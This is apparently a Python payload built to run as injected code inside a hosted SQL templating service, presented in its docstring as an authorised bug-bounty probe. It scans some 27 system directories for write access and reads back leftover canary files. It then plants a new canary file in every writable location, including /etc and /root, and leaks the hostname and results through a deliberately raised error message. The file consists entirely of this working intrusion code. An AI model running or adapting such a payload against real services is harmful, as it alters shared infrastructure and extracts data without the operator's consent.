MARKER = 'A145F9_M2_1B2047C13A46'

def _safe_uid(p):
    try:
        return os.stat(p).st_uid
    except Exception:
        return -1
"""Authorised security-research probe (Bugcrowd dbtlabs-mbb-og1, safe harbour).
Reads process-local directory NAMES, and the content of files whose names
this researcher chose and planted. No environment variables, no network,
no instance metadata, no credentials, no foreign file content."""
import json, os, time
from sqlfluff.core.errors import SQLTemplaterError
CANARY = 'CLEAVE_CANARY_1b2047c13a46.txt'
HOLD = 20
out = {}

def _mine():
    parts = os.getcwd().rstrip('/').split('/')
    return parts[-2] if len(parts) >= 2 else ''

# Widen the persistence question: find EVERY directory this uid can write to,
# plant one self-identifying canary in each, and read back any canary an
# EARLIER run on this pod left behind. If no writable location survives a run,
# cross-run persistence is closed by construction rather than by luck.
CAND = ["/", "/tmp", "/var/tmp", "/dev/shm", "/run", "/run/lock", "/opt", "/srv",
        "/usr/local", "/usr/local/lib", "/usr/local/share", "/home", "/root",
        "/etc", "/venv", "/var", "/var/log", "/var/cache", "/mnt", "/data",
        "/workspace", "/app", "/cache", "/media", "/proc", "/sys", "/tmp/jobs"]
try:
    out["host"] = __import__("socket").gethostname()
    now = time.time()
    try:
        import pwd as _p
        CAND.append(_p.getpwuid(os.getuid()).pw_dir)
    except Exception:
        pass
    try:
        import sqlfluff as _sf
        d = os.path.dirname(_sf.__file__)
        CAND.extend([d, os.path.dirname(os.path.dirname(d))])
    except Exception:
        pass
    CAND.append(os.getcwd())
    seen, wr, missing = [], [], 0
    for q in CAND:
        if q in seen:
            continue
        seen.append(q)
        try:
            if not os.path.isdir(q):
                missing += 1
                continue
        except Exception:
            missing += 1
            continue
        ok = os.access(q, os.W_OK)
        if ok:
            wr.append(q)
    out["n_candidates"] = len(seen)
    out["n_absent"] = missing
    out["writable"] = [q[-40:] for q in wr]
    out["n_writable"] = len(wr)
    # read back FIRST, then plant
    pre = []
    for q in wr:
        f = q.rstrip("/") + "/" + CANARY
        try:
            if os.path.isfile(f):
                with open(f) as fh:
                    pre.append([q[-40:], int(now - os.stat(f).st_mtime), fh.read()[:200]])
        except Exception as exc:
            pre.append([q[-40:], -1, "ERR:" + type(exc).__name__])
    out["preexisting"] = pre
    out["n_preexisting"] = len(pre)
    body = json.dumps({"owner": "cleave-security-research",
                       "purpose": "authorised cross-run persistence canary, dbt MBB",
                       "planted_by_run": _mine(), "planted_at": int(now),
                       "pod": out["host"]}, sort_keys=True)
    planted = 0
    for q in wr:
        try:
            with open(q.rstrip("/") + "/" + CANARY, "w") as fh:
                fh.write(body + chr(10))
            planted += 1
        except Exception:
            pass
    out["n_planted"] = planted
except Exception as exc:
    out["err"] = type(exc).__name__ + ":" + str(exc)[:160]
raise SQLTemplaterError(MARKER + ' ' + json.dumps(out, sort_keys=True))
